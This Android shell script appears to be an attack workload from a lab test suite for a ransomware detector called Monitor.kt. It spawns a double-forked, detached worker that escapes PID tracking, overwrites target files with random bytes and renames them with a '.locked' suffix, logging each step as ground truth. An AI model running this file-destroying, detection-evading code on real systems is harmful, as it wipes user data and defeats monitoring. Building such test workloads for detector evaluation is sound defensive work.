#!/system/bin/sh
# E4 (Extreme): Registered parent spawns a double-forked detached subshell (reparented to init PID 1).
# Monitor.kt fires the alert, but either fails to attribute or kills only the outer shell while the worker continues.
DIR="$(cd "$(dirname "$0")" && pwd)"
WORKLOAD_NAME="E4_detached"
WORKLOAD_LABEL="attack"
. "$DIR/lib.sh"

MAX_FILES="${MAX_FILES:-25}"
DELAY="${DELAY:-0.1}"

verify_lab_env
log_truth "start"

# Spawn detached grandchild worker not tracked by launcher.sh's single PID
(
     (
        OLD_IFS="$IFS"
        IFS='
'
        for f in $(list_attack_targets "$MAX_FILES"); do
            IFS="$OLD_IFS"
            [ ! -f "$f" ] && continue
            sz="$(file_size "$f")"
            head -c "$sz" /dev/urandom > "$f"
            log_truth "overwrite" "$f"
            mv "$f" "${f}.locked"
            log_truth "rename" "$f" "${f}.locked"
            sleep "$DELAY"
        done
        IFS="$OLD_IFS"
        log_truth "end"
    ) </dev/null >/dev/null 2>&1 &
)

# Registered parent sits idle in sleep while detached worker modifies files
sleep 10